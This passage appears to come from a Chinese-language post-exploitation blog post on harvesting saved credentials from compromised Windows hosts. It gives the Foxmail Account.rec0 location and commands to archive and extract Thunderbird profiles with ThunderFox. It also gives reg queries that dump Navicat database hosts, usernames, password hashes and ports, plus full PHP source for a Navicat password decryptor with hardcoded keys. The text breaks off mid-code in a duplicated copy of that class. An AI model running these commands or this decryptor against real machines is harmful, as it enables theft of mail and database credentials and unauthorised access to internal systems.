+<h2 id="Foxmail-离线解密"><a href="#Foxmail-离线解密" class="headerlink" title="Foxmail 离线解密"></a>Foxmail 离线解密</h2><p>将Account.rec0文件拖回本地，该文件默认存放于Foxmail安装目录下的 Storage目录中<br>注：每个邮箱都对应一个单独的Account.rec0，如果有多个邮箱那就把所有的Account.rec0 文件都拖回来<br>C:\Foxmail 7.2\Storage[<a href="mailto:&#117;&#104;&#115;&#x30;&#57;&#48;&#x34;&#x30;&#x31;&#x39;&#50;&#48;&#x32;&#64;&#x31;&#54;&#51;&#46;&#99;&#111;&#109;">&#117;&#104;&#115;&#x30;&#57;&#48;&#x34;&#x30;&#x31;&#x39;&#50;&#48;&#x32;&#64;&#x31;&#54;&#51;&#46;&#99;&#111;&#109;</a>](mailto:<a href="mailto:&#117;&#104;&#x73;&#x30;&#x39;&#48;&#52;&#48;&#49;&#x39;&#50;&#x30;&#x32;&#x40;&#49;&#54;&#x33;&#x2e;&#x63;&#x6f;&#x6d;">&#117;&#104;&#x73;&#x30;&#x39;&#48;&#52;&#48;&#49;&#x39;&#50;&#x30;&#x32;&#x40;&#49;&#54;&#x33;&#x2e;&#x63;&#x6f;&#x6d;</a>)\Accounts<br><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16190753798128.jpg" alt="-w791"><br>本地加载解密<br><a target="_blank" rel="noopener" href="https://securityxploded.com/foxmail-password-decryptor.php">https://securityxploded.com/foxmail-password-decryptor.php</a><br><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16193289653089.jpg" alt="-w530"></p>
+<h2 id="Thunderbird-离线解密"><a href="#Thunderbird-离线解密" class="headerlink" title="Thunderbird 离线解密"></a>Thunderbird 离线解密</h2><p>Mozilla Thunderbird（中文俗称“雷鸟”）是从Mozilla Application Suite独立出来的电子邮件客户端。<br>切到指定用户权限下，然后直接把数据目录下Thunderbird 的用户数据完整打包拖回本地里解密即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># dir %appdata%\Thunderbird\Profiles</span><br><span class="line"># run cmd /c 7z.exe -r -pfxpwd123 a C:\Users\Riter\AppData\Roaming\Thunderbird\Profiles\*.* </span><br><span class="line"># ThunderFox.exe creds /target:&quot;C:\Users\tale\Desktop\1stcbtpv.default-release&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16193332396173.jpg" alt="-w528"></p>
+<h2 id="Navicat-离线解密"><a href="#Navicat-离线解密" class="headerlink" title="Navicat 离线解密"></a>Navicat 离线解密</h2><p>Navicat在内网中遇见的比较多，很多情况下都默认保存了用户密码。<br>在Navicat中保存的所有连接账密，都是直接存到对应注册表项值下的<br>可直接以此来获取各类数据库的连接ip，端口，账号，密码hash，不同的数据库连接信息在注册表中的存放位置稍有不同，以mysql为例：<br>一、mysql数据库连接账密具体存放位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MySQL</span><br><span class="line">HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers\</span><br></pre></td></tr></table></figure>
+
+<p>二、查询当前用户的所有连接记录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># reg query HKEY_CURRENT_USER\Software\PremiumSoft</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16190906026405.jpg" alt="-w560"><br>三、查询Mysql连接账密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># reg query HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers</span><br><span class="line"># reg query HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers /s /v host  数据库连接ip</span><br><span class="line"># reg query HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers /s /v UserName  数据库用户名</span><br><span class="line"># reg query HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers /s /v pwd  密码hash</span><br><span class="line"># reg query HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers /s /v Port 据库连接端口</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16190907706932.jpg" alt="-w585"><br>四、 hash本地解密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 NavicatCipher.py dec B4931811A172BE7059B8</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16190908894155.jpg" alt="-w736"></p>
+<p>或者如下php代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;navicat解密-conan&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> </span><br><span class="line">&lt;form action method=<span class="string">&#x27;post&#x27;</span>&gt;</span><br><span class="line"><span class="number">1</span>.文件-导出连接-选择想要解析的连接,导出文件即可 &lt;/br&gt;</span><br><span class="line">打开ncx文件,Password里就是密码&lt;/br&gt;</span><br><span class="line">加密的密码: &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;a&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&#x27;submit&#x27;</span> name=<span class="string">&#x27;submit&#x27;</span> value=<span class="string">&quot;解密&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NavicatPassword</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$version</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$aesKey</span> = <span class="string">&#x27;libcckeylibcckey&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$aesIv</span> = <span class="string">&#x27;libcciv libcciv &#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$blowString</span> = <span class="string">&#x27;3DC5CA39&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$blowKey</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$blowIv</span> = <span class="literal">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$version</span> = <span class="number">12</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;version = <span class="variable">$version</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blowKey = sha1(<span class="string">&#x27;3DC5CA39&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blowIv = hex2bin(<span class="string">&#x27;d9c7c3c8870d64bd&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;version) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">                <span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;encryptEleven(<span class="variable">$string</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">                <span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;encryptTwelve(<span class="variable">$string</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">encryptEleven</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$round</span> = intval(floor(strlen(<span class="variable">$string</span>) / <span class="number">8</span>));</span><br><span class="line">        <span class="variable">$leftLength</span> = strlen(<span class="variable">$string</span>) % <span class="number">8</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$currentVector</span> = <span class="keyword">$this</span>-&gt;blowIv;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$round</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$temp</span> = <span class="keyword">$this</span>-&gt;encryptBlock(<span class="keyword">$this</span>-&gt;xorBytes(substr(<span class="variable">$string</span>, <span class="number">8</span> * <span class="variable">$i</span>, <span class="number">8</span>), <span class="variable">$currentVector</span>));</span><br><span class="line">            <span class="variable">$currentVector</span> = <span class="keyword">$this</span>-&gt;xorBytes(<span class="variable">$currentVector</span>, <span class="variable">$temp</span>);</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable">$temp</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$leftLength</span>) &#123;</span><br><span class="line">            <span class="variable">$currentVector</span> = <span class="keyword">$this</span>-&gt;encryptBlock(<span class="variable">$currentVector</span>);</span><br><span class="line">            <span class="variable">$result</span> .= <span class="keyword">$this</span>-&gt;xorBytes(substr(<span class="variable">$string</span>, <span class="number">8</span> * <span class="variable">$i</span>, <span class="variable">$leftLength</span>), <span class="variable">$currentVector</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> strtoupper(bin2hex(<span class="variable">$result</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">encryptBlock</span>(<span class="params"><span class="variable">$block</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> openssl_encrypt(<span class="variable">$block</span>, <span class="string">&#x27;BF-ECB&#x27;</span>, <span class="keyword">$this</span>-&gt;blowKey, OPENSSL_RAW_DATA|OPENSSL_NO_PADDING); </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">decryptBlock</span>(<span class="params"><span class="variable">$block</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> openssl_decrypt(<span class="variable">$block</span>, <span class="string">&#x27;BF-ECB&#x27;</span>, <span class="keyword">$this</span>-&gt;blowKey, OPENSSL_RAW_DATA|OPENSSL_NO_PADDING); </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">xorBytes</span>(<span class="params"><span class="variable">$str1</span>, <span class="variable">$str2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$str1</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$result</span> .= chr(ord(<span class="variable">$str1</span>[<span class="variable">$i</span>]) ^ ord(<span class="variable">$str2</span>[<span class="variable">$i</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">encryptTwelve</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = openssl_encrypt(<span class="variable">$string</span>, <span class="string">&#x27;AES-128-CBC&#x27;</span>, <span class="keyword">$this</span>-&gt;aesKey, OPENSSL_RAW_DATA, <span class="keyword">$this</span>-&gt;aesIv);</span><br><span class="line">        <span class="keyword">return</span> strtoupper(bin2hex(<span class="variable">$result</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;version) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">                <span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;decryptEleven(<span class="variable">$string</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">                <span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;decryptTwelve(<span class="variable">$string</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">decryptEleven</span>(<span class="params"><span class="variable">$upperString</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$string</span> = hex2bin(strtolower(<span class="variable">$upperString</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$round</span> = intval(floor(strlen(<span class="variable">$string</span>) / <span class="number">8</span>));</span><br><span class="line">        <span class="variable">$leftLength</span> = strlen(<span class="variable">$string</span>) % <span class="number">8</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$currentVector</span> = <span class="keyword">$this</span>-&gt;blowIv;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$round</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$encryptedBlock</span> = substr(<span class="variable">$string</span>, <span class="number">8</span> * <span class="variable">$i</span>, <span class="number">8</span>);</span><br><span class="line">            <span class="variable">$temp</span> = <span class="keyword">$this</span>-&gt;xorBytes(<span class="keyword">$this</span>-&gt;decryptBlock(<span class="variable">$encryptedBlock</span>), <span class="variable">$currentVector</span>);</span><br><span class="line">            <span class="variable">$currentVector</span> = <span class="keyword">$this</span>-&gt;xorBytes(<span class="variable">$currentVector</span>, <span class="variable">$encryptedBlock</span>);</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable">$temp</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$leftLength</span>) &#123;</span><br><span class="line">            <span class="variable">$currentVector</span> = <span class="keyword">$this</span>-&gt;encryptBlock(<span class="variable">$currentVector</span>);</span><br><span class="line">            <span class="variable">$result</span> .= <span class="keyword">$this</span>-&gt;xorBytes(substr(<span class="variable">$string</span>, <span class="number">8</span> * <span class="variable">$i</span>, <span class="variable">$leftLength</span>), <span class="variable">$currentVector</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">decryptTwelve</span>(<span class="params"><span class="variable">$upperString</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$string</span> = hex2bin(strtolower(<span class="variable">$upperString</span>));</span><br><span class="line">        <span class="keyword">return</span> openssl_decrypt(<span class="variable">$string</span>, <span class="string">&#x27;AES-128-CBC&#x27;</span>, <span class="keyword">$this</span>-&gt;aesKey, OPENSSL_RAW_DATA, <span class="keyword">$this</span>-&gt;aesIv);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="comment">//需要指定版本，11或12</span></span><br><span class="line"><span class="variable">$navicatPassword</span> = <span class="keyword">new</span> NavicatPassword(<span class="number">12</span>);</span><br><span class="line"><span class="comment">//$navicatPassword = new NavicatPassword(11);</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//解密</span></span><br><span class="line"><span class="comment">//$decode = $navicatPassword-&gt;decrypt(&#x27;15057D7BA390&#x27;);</span></span><br><span class="line"><span class="variable">$decode</span> = <span class="variable">$navicatPassword</span>-&gt;decrypt(trim(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$decode</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span>&lt;/br&gt;&lt;/br&gt;</span><br><span class="line"><span class="number">2</span>.注册表regedit&lt;/br&gt;</span><br><span class="line">MySQL HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers\&lt;/br&gt;</span><br><span class="line"></span><br><span class="line">MariaDB HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers\&lt;/br&gt;</span><br><span class="line"></span><br><span class="line">MicrosoftSQL HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers\&lt;/br&gt;</span><br><span class="line"></span><br><span class="line">Oracle HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers\&lt;/br&gt;</span><br><span class="line"></span><br><span class="line">PostgreSQL HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers\&lt;/br&gt;</span><br><span class="line"></span><br><span class="line">SQLite HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers\&lt;/br&gt;</span><br><span class="line"></span><br><span class="line">读取PWD字段&lt;/br&gt;</span><br><span class="line">加密的密码: &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;b&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&#x27;submit&#x27;</span> name=<span class="string">&#x27;submit&#x27;</span> value=<span class="string">&quot;解密&quot;</span>/&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NavicatPassword1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$version</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$aesKey</span> = <span class="string">&#x27;libcckeylibcckey&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$aesIv</span> = <span class="string">&#x27;libcciv libcciv &#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$blowString</span> = <span class="string">&#x27;3DC5CA39&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$blowKey</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$blowIv</span> = <span class="literal">null</span>;</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$version</span> = <span class="number">12</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;version = <span class="variable">$version</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blowKey = sha1(<span class="string">&#x27;3DC5CA39&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blowIv = hex2bin(<span class="string">&#x27;d9c7c3c8870d64bd&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;version) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">                <span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;encryptEleven(<span class="variable">$string</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">                <span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;encryptTwelve(<span class="variable">$string</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">encryptEleven</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$round</span> = intval(floor(strlen(<span class="variable">$string</span>) / <span class="number">8</span>));</span><br><span class="line">        <span class="variable">$leftLength</span> = strlen(<span class="variable">$string</span>) % <span class="number">8</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$currentVector</span> = <span class="keyword">$this</span>-&gt;blowIv;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span 